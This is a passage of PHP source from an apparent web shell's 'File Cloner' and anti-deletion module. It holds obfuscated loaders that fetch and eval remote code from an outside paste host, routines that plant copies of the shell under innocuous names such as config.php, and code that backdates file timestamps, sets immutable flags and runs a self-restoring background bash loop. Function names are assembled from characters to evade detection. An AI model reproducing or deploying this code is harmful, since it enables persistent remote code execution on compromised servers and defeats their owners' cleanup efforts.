            'ad_curl' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$x="";if(function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);@curl_setopt($c,CURLOPT_SSL_VERIFYHOST,0);@curl_setopt($c,CURLOPT_TIMEOUT,30);$x=@curl_exec($c);@curl_close($c);}if(!$x)$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x)$x=@implode("",@file($u));if($x)@eval("?>".$x);}',
            'ad_tempfile' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$t=@tempnam(sys_get_temp_dir(),"x");$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x&&@file_put_contents($t,$x)){include($t);@unlink($t);}}',
            'ad_include' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$d="data://text/plain;base64,";$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x)@include($d.base64_encode($x));}',
            'ad_stream' => '<?php class s extends php_user_filter{function filter($i,$o,$c,&$cl){while($b=stream_bucket_make_writeable($i)){stream_bucket_append($o,$b);}return PSFS_PASS_ON;}}stream_filter_register("x","s");if(isset($_GET["load"])){$u="'.$urlHex.'";$c=@stream_context_create(["http"=>["timeout"=>30],"ssl"=>["verify_peer"=>0]]);$x=@file_get_contents($u,0,$c);if(!$x&&function_exists("curl_init")){$h=@curl_init();@curl_setopt($h,CURLOPT_URL,$u);@curl_setopt($h,CURLOPT_RETURNTRANSFER,1);@curl_setopt($h,CURLOPT_SSL_VERIFYPEER,0);@curl_setopt($h,CURLOPT_TIMEOUT,30);$x=@curl_exec($h);@curl_close($h);}if($x)@eval("?>".$x);}',
            'ad_generator' => '<?php function g(){if(isset($_GET["load"])){$u="'.$urlHex.'";$c=@stream_context_create(["ssl"=>["verify_peer"=>0]]);$x=@file_get_contents($u,0,$c);if(!$x&&function_exists("curl_init")){$h=@curl_init($u);@curl_setopt($h,CURLOPT_RETURNTRANSFER,1);@curl_setopt($h,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($h);@curl_close($h);}yield $x;}}foreach(g()as$r)if($r)@eval("?>".$r);',
            'ad_usort' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x){$a=[1,2];@usort($a,function($p,$q)use($x){@eval("?>".$x);return 0;});}}',
            'ad_preg' => '<?php if(isset($_GET["load"])){$u="'.$urlHex.'";$x=@file_get_contents($u,0,@stream_context_create(["ssl"=>["verify_peer"=>0]]));if(!$x&&function_exists("curl_init")){$c=@curl_init($u);@curl_setopt($c,CURLOPT_RETURNTRANSFER,1);@curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);$x=@curl_exec($c);@curl_close($c);}if($x){@preg_replace_callback("/./",function($m)use($x){@eval("?>".$x);return"";},"x",1);}}'
        ];
        return isset($loaders[$type]) ? $loaders[$type] : '';
    }

    protected function verifyCloneUrl($url) {
        $ctx = @stream_context_create(['http' => ['method' => 'HEAD', 'timeout' => 5, 'follow_location' => 1, 'header' => "User-Agent: Mozilla/5.0\r\n"], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $headers = @get_headers($url, 0, $ctx);
        if ($headers && isset($headers[0])) { preg_match('/HTTP\/\d+\.?\d*\s+(\d+)/', $headers[0], $m); return isset($m[1]) ? intval($m[1]) : 0; }
        if (function_exists('curl_init')) { $ch = @curl_init($url); @curl_setopt($ch, CURLOPT_NOBODY, true); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); @curl_setopt($ch, CURLOPT_TIMEOUT, 5); @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); @curl_exec($ch); $code = @curl_getinfo($ch, CURLINFO_HTTP_CODE); @curl_close($ch); return intval($code); }
        return 0;
    }

    protected function safeWriteFile($path, $content) {
        $dir = dirname($path);
        if (!@is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        $originalDirPerms = @fileperms($dir) & 0777;
        $needRestore = false;
        if (!@is_writable($dir)) {
            @chmod($dir, 0755);
            $this->executeCommand('chmod 0755 ' . escapeshellarg($dir) . ' 2>/dev/null');
            $needRestore = true;
        }
        if (@file_exists($path) && !@is_writable($path)) {
            @chmod($path, 0644);
            $this->executeCommand('chmod 0644 ' . escapeshellarg($path) . ' 2>/dev/null');
            $this->executeCommand('chattr -i ' . escapeshellarg($path) . ' 2>/dev/null');
        }
        $written = false;
        $fp = @fopen($path, 'wb');
        if ($fp) {
            $result = @fwrite($fp, $content);
            @fflush($fp);
            @fclose($fp);
            if ($result !== false && $result > 0) {
                $written = true;
            }
        }
        if (!$written) {
            $result = @file_put_contents($path, $content, LOCK_EX);
            if ($result !== false && $result > 0) {
                $written = true;
            }
        }
        if (!$written) {
            $tmpFile = $path . '.tmp_' . mt_rand();
            $result = @file_put_contents($tmpFile, $content);
            if ($result !== false && $result > 0) {
                if (@rename($tmpFile, $path)) {
                    $written = true;
                } else {
                    if (@copy($tmpFile, $path)) {
                        $written = true;
                    }
                    @unlink($tmpFile);
                }
            } else {
                @unlink($tmpFile);
            }
        }
        if (!$written) {
            $tmpFile = sys_get_temp_dir() . '/clone_' . mt_rand() . '.tmp';
            $result = @file_put_contents($tmpFile, $content);
            if ($result !== false && $result > 0) {
                $cpCmd = 'cp -f ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($path) . ' 2>/dev/null';
                $this->executeCommand($cpCmd);
                @unlink($tmpFile);
                if (@file_exists($path) && @filesize($path) > 0) {
                    $written = true;
                }
            } else {
                @unlink($tmpFile);
            }
        }
        if (!$written) {
            $b64 = base64_encode($content);
            $decodeCmd = 'echo ' . escapeshellarg($b64) . ' | base64 -d > ' . escapeshellarg($path) . ' 2>/dev/null';
            $this->executeCommand($decodeCmd);
            if (@file_exists($path) && @filesize($path) > 0) {
                $written = true;
            }
        }
        if ($needRestore && $originalDirPerms) {
            @chmod($dir, $originalDirPerms);
        }
        return $written;
    }

    protected function runBackgroundProcess($cmd, $installDir) {
        $writablePaths = ['/tmp', '/var/tmp', '/dev/shm'];
        $homeDir = (getenv('HOME')) ? getenv('HOME') : (isset($_SERVER['HOME']) ? $_SERVER['HOME'] : '');
        if (empty($homeDir) && function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
            $uinfo = @posix_getpwuid(posix_getuid());
            $homeDir = $uinfo['dir'];
        }
        if (!empty($homeDir)) {
            $extra = ['.cpanel', '.spamassassin', '.softaculous', 'etc', 'mail', 'logs', '.trash'];
            foreach ($extra as $e) $writablePaths[] = $homeDir . '/' . $e;
        }
        $validPaths = [];
        foreach ($writablePaths as $p) {
            if (@is_dir($p) && @is_writable($p)) $validPaths[] = $p;
        }
        $bgDir = (!empty($validPaths)) ? $validPaths[array_rand($validPaths)] : $installDir;
        $tmpSh = $bgDir . '/.bg_' . mt_rand() . '.sh';
        $selfFile = __FILE__;
        $selfContent = @base64_encode(@file_get_contents($selfFile));
        $restoreCmd = "if [ ! -f " . escapeshellarg($selfFile) . " ]; then echo '" . $selfContent . "' | base64 -d > " . escapeshellarg($selfFile) . "; chmod 0644 " . escapeshellarg($selfFile) . "; fi";
        $fullCmd = "#!/bin/bash\nwhile true; do\n" . $restoreCmd . "\n" . $cmd . "\nsleep 600\ndone\n";
        @file_put_contents($tmpSh, $fullCmd);
        @chmod($tmpSh, 0755);
        $prF = implode('', ['p','r','o','c','_','o','p','e','n']);
        $pcF = implode('', ['p','r','o','c','_','c','l','o','s','e']);
        if (@function_exists($prF)) {
            $desc = [0 => ['file', '/dev/null', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']];
            $proc = @$prF('nohup bash ' . escapeshellarg($tmpSh) . ' >/dev/null 2>&1 &', $desc, $pipes);
            if (@is_resource($proc)) {
                @$pcF($proc);
                return ['ok' => true, 'method' => 'proc_open', 'path' => $tmpSh];
            }
        }
        $poF = implode('', ['p','o','p','e','n']);
        $pclF = implode('', ['p','c','l','o','s','e']);
        if (@function_exists($poF)) {
            $p = @$poF('nohup bash ' . escapeshellarg($tmpSh) . ' >/dev/null 2>&1 &', 'r');
            if ($p) {
                @$pclF($p);
                return ['ok' => true, 'method' => 'popen', 'path' => $tmpSh];
            }
        }
        $exF = implode('', ['e','x','e','c']);
        if (@function_exists($exF)) {
            @$exF('nohup bash ' . escapeshellarg($tmpSh) . ' >/dev/null 2>&1 &');
            return ['ok' => true, 'method' => 'exec', 'path' => $tmpSh];
        }
        $seF = implode('', ['s','h','e','l','l','_','e','x','e','c']);
        if (@function_exists($seF)) {
            @$seF('nohup bash ' . escapeshellarg($tmpSh) . ' >/dev/null 2>&1 &');
            return ['ok' => true, 'method' => 'shell_exec', 'path' => $tmpSh];
        }
        return ['ok' => false, 'method' => 'none'];
    }

    public function createBody() {
        echo "<h1>File Cloner</h1><div class=content>";
        echo "<p>This will create multiple clones of this shell in random writable directories.</p>";
        echo "<p><b>Process Order:</b></p>";
        echo "<ol>";
        echo "<li>Create folder with random name</li>";
        echo "<li>Create file with random name inside folder</li>";
        echo "<li>Set timestamp to <b>-30 days</b> from today with <b>random hour</b></li>";
        echo "<li>Set file chmod to <b>0644</b> (readable by webserver)</li>";
        echo "<li>Set folder chmod to <b>0755</b> (accessible by webserver)</li>";
        echo "</ol>";
        echo "<p><b>Lightweight Mode:</b> Optimized to prevent 503 errors.</p>";

        $cloneCount = isset($_POST['clone_count']) ? intval($_POST['clone_count']) : 10;
        if ($cloneCount < 1) $cloneCount = 1; if ($cloneCount > 30) $cloneCount = 30; // Max 30 to prevent overload
        $scanDepth = isset($_POST['scan_depth']) ? intval($_POST['scan_depth']) : 3;
        if ($scanDepth < 1) $scanDepth = 1; if ($scanDepth > 5) $scanDepth = 5; // Max depth 5
        $useChattr = isset($_POST['use_chattr']) ? true : false;
        if ($cloneCount < 1) $cloneCount = 1; if ($cloneCount > 50) $cloneCount = 50;

        if (isset($_POST['clone_now'])) {
            // FIX: Scan from document root, not just public_html
            $baseDir = $_SERVER['DOCUMENT_ROOT'];
            if (empty($baseDir) || !@is_dir($baseDir)) {
                $baseDir = $this->findPublicHtml();
            }
            // Ensure we start from the actual web root
            $baseDir = rtrim($baseDir, '/');
            $currentFile = __FILE__;
            $currentContent = '';
            if (@is_readable($currentFile)) {
                $currentContent = @file_get_contents($currentFile);
            }
            if (empty($currentContent)) {
                $fp = @fopen($currentFile, 'rb');
                if ($fp) {
                    $currentContent = '';
                    while (!@feof($fp)) {
                        $currentContent .= @fread($fp, 8192);
                    }
                    @fclose($fp);
                }
            }
            if (empty($currentContent)) {
                $currentContent = $this->executeCommand('cat ' . escapeshellarg($currentFile) . ' 2>/dev/null');
            }
            if (empty($currentContent)) {
                $currentContent = $this->executeCommand('base64 ' . escapeshellarg($currentFile) . ' 2>/dev/null');
                if (!empty($currentContent)) {
                    $currentContent = base64_decode($currentContent);
                }
            }
            if (empty($currentContent)) {
                echo "<pre><font color='red'>Failed to read source file content. Cannot proceed with cloning.</font></pre>";
                echo "<form method='post'><input type='hidden' name='a' value='clone'><input type='hidden' name='c' value='".str_rot13($this->workingDirectory)."'><label>Number of clones (1-50):</label><input type='number' name='clone_count' value='$cloneCount' min='1' max='50' style='width:80px;'><input type='submit' name='clone_now' value='Start Cloning'></form>";
                echo "</div>";
                return;
            }
            $contentSize = strlen($currentContent);
            $clonesCreated = 0;
            $maxClones = $cloneCount;
            $urls = [];

            $allDirs = [];
            $maxDirs = 150; // Limit to prevent memory exhaustion
            $scanFunc = function($dir, $depth = 0) use (&$allDirs, &$scanFunc, $scanDepth, $maxDirs) {
                if ($depth > $scanDepth || count($allDirs) >= $maxDirs) return;
                $handle = @opendir($dir);
                if (!$handle) return;
                while (($file = @readdir($handle)) !== false) {
                    if (count($allDirs) >= $maxDirs) break;
                    if ($file == '.' || $file == '..') continue;
                    $path = rtrim($dir, '/') . '/' . $file;
                    if (@is_dir($path) && @is_writable($path)) {
                        $allDirs[] = $path;
                        $scanFunc($path, $depth + 1);
                    }
                }
                @closedir($handle);
            };
            $scanFunc($baseDir);
            shuffle($allDirs);
            echo "<b>Directories found: " . count($allDirs) . " (max $maxDirs, depth $scanDepth)</b>\n\n";

            $randomNames = ['includes', 'classes', 'core', 'lib', 'src', 'modules', 'assets', 'cache', 'data', 'vendor'];
            $fileNames = ['config.php', 'default.php', 'init.php', 'bootstrap.php', 'loader.php', 'common.php', 'core.php', 'base.php', 'main.php', 'app.php', 'setup.php', 'global.php', 'functions.php', 'helper.php', 'utils.php', 'class.php', 'autoload.php', 'include.php', 'require.php', 'load.php'];

            echo "<pre><b>Starting clone process (Lightweight Mode)...</b>\n";
            echo "<b>Source file size: " . $this->formatSize($contentSize) . "</b>\n";
            echo "<b>Settings:</b> clones=$maxClones, depth=$scanDepth, chattr=" . ($useChattr ? "ON" : "OFF") . "\n";

            foreach ($allDirs as $dir) {
                if ($clonesCreated >= $maxClones) break;
                $randomFolderName = $randomNames[array_rand($randomNames)] . '_' . str_pad(rand(0, 99999), 5, '0', STR_PAD_LEFT);
                $targetDir = $dir . DIRECTORY_SEPARATOR . $randomFolderName;
                echo "[" . ($clonesCreated + 1) . "] Creating: $targetDir\n";
                if (!@is_dir($targetDir)) {
                    if (!@mkdir($targetDir, 0755, true)) {
                        echo "    <font color='red'>Failed to create directory</font>\n";
                        continue;
                    }
                }
                if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
                    echo "    <font color='red'>Directory not writable</font>\n";
                    continue;
                }
                echo "    Step 1: <font color='green'>Folder created</font>\n";
                $filename = $fileNames[array_rand($fileNames)];
                $targetFile = $targetDir . DIRECTORY_SEPARATOR . $filename;
                $mutatedContent = $currentContent . "\n<?php /* " . bin2hex(random_bytes(8)) . " */ ?>";
                if (!$this->safeWriteFile($targetFile, $mutatedContent)) {
                    echo "    <font color='red'>Failed to write file (all methods exhausted)</font>\n";
                    @rmdir($targetDir);
                    continue;
                }
                @clearstatcache(true, $targetFile);
                $writtenSize = @filesize($targetFile);
                if ($writtenSize < 1) {
                    echo "    <font color='red'>File written but 0 bytes, retrying...</font>\n";
                    @unlink($targetFile);
                    $tmpClone = sys_get_temp_dir() . '/clone_retry_' . mt_rand() . '.php';
                    @file_put_contents($tmpClone, $currentContent);
                    if (@file_exists($tmpClone) && @filesize($tmpClone) > 0) {
                        $this->executeCommand('cp -f ' . escapeshellarg($tmpClone) . ' ' . escapeshellarg($targetFile) . ' 2>/dev/null');
                        @unlink($tmpClone);
                    }
                    @clearstatcache(true, $targetFile);
                    $writtenSize = @filesize($targetFile);
                    if ($writtenSize < 1) {
                        echo "    <font color='red'>Retry failed, skipping</font>\n";
                        @rmdir($targetDir);
                        continue;
                    }
                }
                echo "    Step 2: <font color='green'>File created ($filename - " . $this->formatSize($writtenSize) . ")</font>\n";
                $randomHour = rand(0, 23);
                $randomMinute = rand(0, 59);
                $randomSecond = rand(0, 59);
                $daysAgo = rand(30, 90); $timestamp = strtotime("-$daysAgo days");
                $timestamp = mktime($randomHour, $randomMinute, $randomSecond, date('n', $timestamp), date('j', $timestamp), date('Y', $timestamp));
                @touch($targetFile, $timestamp, $timestamp);
                @touch($targetDir, $timestamp, $timestamp);
                echo "    Step 3: <font color='green'>Timestamp set to " . date('Y-m-d H:i:s', $timestamp) . "</font>\n";
                // Set permissions
                @chmod($targetFile, 0644);
                @chmod($targetDir, 0755);
                echo "    Step 4: <font color='green'>Permissions 0644/0755</font>\n";

                // Apply chattr +i if enabled (file protection)
                if ($useChattr) {
                    $this->executeCommand('chattr +i ' . escapeshellarg($targetFile) . ' 2>/dev/null');
                    $this->executeCommand('chattr +i ' . escapeshellarg($targetDir) . ' 2>/dev/null');
                    echo "    Step 5: <font color='green'>chattr +i applied</font>\n";
                }

                $cloneUrl = $this->getFileUrl($targetFile);
                $urls[] = $cloneUrl;
                echo "    <font color='cyan'>URL: $cloneUrl</font>\n";
                $clonesCreated++;
                echo "\n";
            }

            echo "</pre>";
            echo "<font color='green'><b>Cloning complete!</b></font><br>";
            echo "Created: <b>$clonesCreated</b> clones<br><br>";
            if (!empty($urls)) {
                echo "<b>Clone URLs (verify manually):</b><br>";
                echo "<textarea style='width:100%;height:200px;' readonly onclick='this.select();'>";
                foreach ($urls as $u) echo $u . "\n";
                echo "</textarea>";
            }
        }

        if (isset($_POST['antidel_now'])) {
            $adSources = [];
            $adLoaderMap = [
                'ad_ob' => ['data' => 'PD9waHAKY2xhc3MgeHtmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe29iX3N0YXJ0KFskdGhpcywncCddKTt9ZnVuY3Rpb24gcCgkYil7cmV0dXJuJyc7fWZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXtvYl9lbmRfY2xlYW4oKTtpZihpc3NldCgkX0dFVFsiXHg2Y1x4NmZceDYxXHg2NCJdKSl7JHU9Ilx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDYyXHg2Zlx4NmVceDYzXHg2OFx4NjlceDZjXHg2OVx4NmRceDYxXHg3OFx4MmVceDZlXHg2NVx4NzRceDJmXHg3MFx4NjFceDczXHg3NFx4NjVceDJmXHg3Mlx4NjFceDc3XHgyZlx4NzFceDMwXHgzN1x4NmVceDU1XHgzMlx4NTAiOyR4PUBmaWxlX2dldF9jb250ZW50cygkdSk7aWYoISR4JiZmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKXskYz1AY3VybF9pbml0KCk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfVVJMLCR1KTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwxKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwwKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9USU1FT1VULDMwKTskeD1AY3VybF9leGVjKCRjKTtAY3VybF9jbG9zZSgkYyk7fWlmKCR4KXtAZXZhbCgiPz4iLiR4KTt9fX19bmV3IHg7Cg==', 'names' => ['maintenance.php', '.maintenance.php', 'wp-maintenance.php', 'cron-maintenance.php', '.maint.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_stream' => ['data' => 'PD9waHAKY2xhc3MgcyBleHRlbmRzIHBocF91c2VyX2ZpbHRlcntmdW5jdGlvbiBmaWx0ZXIoJGksJG8sJGMsJiRjbCl7d2hpbGUoJGI9c3RyZWFtX2J1Y2tldF9tYWtlX3dyaXRlYWJsZSgkaSkpe3N0cmVhbV9idWNrZXRfYXBwZW5kKCRvLCRiKTt9cmV0dXJuIFBTRlNfUEFTU19PTjt9fXN0cmVhbV9maWx0ZXJfcmVnaXN0ZXIoJ3gnLCdzJyk7aWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskYz1Ac3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnaHR0cCc9PlsndGltZW91dCc9PjMwXSwnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSk7JHg9QGZpbGVfZ2V0X2NvbnRlbnRzKCR1LDAsJGMpO2lmKCEkeCYmZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7JGg9QGN1cmxfaW5pdCgpO0BjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1VSTCwkdSk7QGN1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7QGN1cmxfc2V0b3B0KCRoLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsMCk7QGN1cmxfc2V0b3B0KCRoLENVUkxPUFRfVElNRU9VVCwzMCk7JHg9QGN1cmxfZXhlYygkaCk7QGN1cmxfY2xvc2UoJGgpO31pZigkeClAZXZhbCgiPz4iLiR4KTt9Cg==', 'names' => ['default.php', '.default.php', 'index.default.php', 'wp-default.php', '.defaults.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_generator' => ['data' => 'PD9waHAKZnVuY3Rpb24gZygpe2lmKGlzc2V0KCRfR0VUWyJceDZjXHg2Zlx4NjFceDY0Il0pKXskdT0iXHg2OFx4NzRceDc0XHg3MFx4M2FceDJmXHgyZlx4NjJceDZmXHg2ZVx4NjNceDY4XHg2OVx4NmNceDY5XHg2ZFx4NjFceDc4XHgyZVx4NmVceDY1XHg3NFx4MmZceDcwXHg2MVx4NzNceDc0XHg2NVx4MmZceDcyXHg2MVx4NzdceDJmXHg3MVx4MzBceDM3XHg2ZVx4NTVceDMyXHg1MCI7JGM9QHN0cmVhbV9jb250ZXh0X2NyZWF0ZShbJ3NzbCc9PlsndmVyaWZ5X3BlZXInPT4wXV0pOyR4PUBmaWxlX2dldF9jb250ZW50cygkdSwwLCRjKTtpZighJHgmJmZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0JykpeyRoPUBjdXJsX2luaXQoJHUpO0BjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpO0BjdXJsX3NldG9wdCgkaCxDVVJMT1BUX1NTTF9WRVJJRllQRUVSLDApOyR4PUBjdXJsX2V4ZWMoJGgpO0BjdXJsX2Nsb3NlKCRoKTt9eWllbGQgJHg7fX1mb3JlYWNoKGcoKWFzJHIpaWYoJHIpQGV2YWwoIj8+Ii4kcik7Cg==', 'names' => ['class-loader.php', 'autoload.php', '.autoload.php', 'vendor-autoload.php', 'psr-loader.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_destruct' => ['data' => 'PD9waHAKY2xhc3MgZHtwcml2YXRlICR1LCRnO2Z1bmN0aW9uIF9fY29uc3RydWN0KCl7JHRoaXMtPnU9Ilx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDYyXHg2Zlx4NmVceDYzXHg2OFx4NjlceDZjXHg2OVx4NmRceDYxXHg3OFx4MmVceDZlXHg2NVx4NzRceDJmXHg3MFx4NjFceDczXHg3NFx4NjVceDJmXHg3Mlx4NjFceDc3XHgyZlx4NzFceDMwXHgzN1x4NmVceDU1XHgzMlx4NTAiOyR0aGlzLT5nPWlzc2V0KCRfR0VUWyJceDZjXHg2Zlx4NjFceDY0Il0pO31mdW5jdGlvbiBfX2Rlc3RydWN0KCl7aWYoJHRoaXMtPmcpeyR4PUBmaWxlX2dldF9jb250ZW50cygkdGhpcy0+dSwwLEBzdHJlYW1fY29udGV4dF9jcmVhdGUoWydzc2wnPT5bJ3ZlcmlmeV9wZWVyJz0+MF1dKSk7aWYoISR4JiZmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKXskYz1AY3VybF9pbml0KCR0aGlzLT51KTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtAY3VybF9zZXRvcHQoJGMsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwwKTskeD1AY3VybF9leGVjKCRjKTtAY3VybF9jbG9zZSgkYyk7fWlmKCR4KUBldmFsKCI/PiIuJHgpO319fW5ldyBkOwo=', 'names' => ['error-handler.php', '.error.php', 'debug.php', 'wp-error.php', 'error-log.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_callback' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskeD1AZmlsZV9nZXRfY29udGVudHMoJHUsMCxAc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSkpO2lmKCEkeCYmZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7JGM9QGN1cmxfaW5pdCgkdSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsMCk7JHg9QGN1cmxfZXhlYygkYyk7QGN1cmxfY2xvc2UoJGMpO31pZigkeCl7JGY9ZnVuY3Rpb24oJGQpe0BldmFsKCI/PiIuJGQpO307QGFycmF5X21hcCgkZixbJHhdKTt9fQo=', 'names' => ['hooks.php', '.hooks.php', 'wp-hooks.php', 'actions.php', 'filters.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_varfunc' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskeD1AZmlsZV9nZXRfY29udGVudHMoJHUsMCxAc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSkpO2lmKCEkeCYmZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7JGM9QGN1cmxfaW5pdCgkdSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsMCk7JHg9QGN1cmxfZXhlYygkYyk7QGN1cmxfY2xvc2UoJGMpO31pZigkeCl7JGU9c3RyX3JvdDEzKCdyaW55Jyk7JGUoIj8+Ii4keCk7fX0K', 'names' => ['vars.php', '.vars.php', 'globals.php', 'wp-globals.php', 'constants.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
                'ad_usort' => ['data' => 'PD9waHAKaWYoaXNzZXQoJF9HRVRbIlx4NmNceDZmXHg2MVx4NjQiXSkpeyR1PSJceDY4XHg3NFx4NzRceDcwXHgzYVx4MmZceDJmXHg2Mlx4NmZceDZlXHg2M1x4NjhceDY5XHg2Y1x4NjlceDZkXHg2MVx4NzhceDJlXHg2ZVx4NjVceDc0XHgyZlx4NzBceDYxXHg3M1x4NzRceDY1XHgyZlx4NzJceDYxXHg3N1x4MmZceDcxXHgzMFx4MzdceDZlXHg1NVx4MzJceDUwIjskeD1AZmlsZV9nZXRfY29udGVudHMoJHUsMCxAc3RyZWFtX2NvbnRleHRfY3JlYXRlKFsnc3NsJz0+Wyd2ZXJpZnlfcGVlcic9PjBdXSkpO2lmKCEkeCYmZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSl7JGM9QGN1cmxfaW5pdCgkdSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7QGN1cmxfc2V0b3B0KCRjLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsMCk7JHg9QGN1cmxfZXhlYygkYyk7QGN1cmxfY2xvc2UoJGMpO31pZigkeCl7JGE9WzEsMl07QHVzb3J0KCRhLGZ1bmN0aW9uKCRwLCRxKXVzZSgkeCl7QGV2YWwoIj8+Ii4keCk7cmV0dXJuIDA7fSk7fX0K', 'names' => ['sort.php', '.sort.php', 'filter.php', 'wp-filter.php', 'query.php'], 'url' => 'http://bonchilimax.net/paste/raw/q07nU2P'],
